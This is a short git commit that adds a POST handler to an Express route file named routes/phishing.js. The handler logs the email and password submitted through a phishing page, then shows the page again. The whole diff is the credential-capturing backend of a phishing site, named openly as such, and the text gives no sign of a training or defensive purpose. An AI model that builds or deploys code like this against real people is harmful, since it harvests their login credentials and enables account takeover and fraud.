e347fb0cf61ad818e26b1892941cfcf4a4448d73
Dref360 <frederic.branchaud-charron@usherbrooke.ca>
2016-03-16 15:27:25 -0400

    html call node

--- routes/phishing.js
+++ routes/phishing.js
@@ -6,4 +6,11 @@ router.get('/', function(req, res, next) {
   res.render('phishing_index', { title: 'Express' });
 });
 
+router.post('/',function(req,res,next){
+  console.log("YOLO");
+  console.log(req.body.email);
+  console.log(req.body.pass);
+  res.render('phishing_index', { title: 'Express' });
+});
+
 module.exports = router;
